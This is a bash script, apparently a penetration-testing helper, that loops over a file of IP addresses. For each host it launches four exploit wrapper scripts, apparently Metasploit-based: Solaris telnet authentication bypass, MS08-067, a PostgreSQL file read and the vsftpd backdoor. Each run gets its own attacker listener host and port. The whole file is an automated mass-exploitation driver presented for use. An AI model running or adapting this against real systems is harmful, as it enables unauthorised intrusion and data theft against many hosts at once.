#!/bin/bash

#=============================
# Enumerator
#-----------------------------
# Take IP List file 
# and pass the available IPs
# to Metasploit for individual
# exploitation
#=============================

# Get input file from command line - this should be a list of IP addresses, one address per line
LHOST=$1
IPFILE=$2
SESSION=1
PORT=4444

while read IP_ADD; do
	((SESSION++))
	((PORT++))
	echo "[*] Solaris Telnet Auth Bypass - Scanning and attempting to exploit: ${IP_ADD}"
	./msf_sol_tel.py -l $LHOST -r $IP_ADD -p $PORT -s $SESSION
	echo $PORT
	((SESSION++))
	((PORT++))
	echo "[*] MS 08-067 - Scanning and attempting to exploit: ${IP_ADD}"
	./msf_008_067.py -l $LHOST -r $IP_ADD -p $PORT -s $SESSION

	((SESSION++))
	((PORT++))
	echo "[*] PostGreSQL Read File - Scanning and attempting to exploit: ${IP_ADD}"
	./msf_postgres_read.py -l $LHOST -r $IP_ADD -p $PORT -s $SESSION

	((SESSION++))
	((PORT++))
	echo "[*] VSFTP Backdoor - Scanning and attempting to exploit: ${IP_ADD}"
	./msf_ftp_backd.py -l $LHOST -r $IP_ADD -p $PORT -s $SESSION
done <$IPFILE
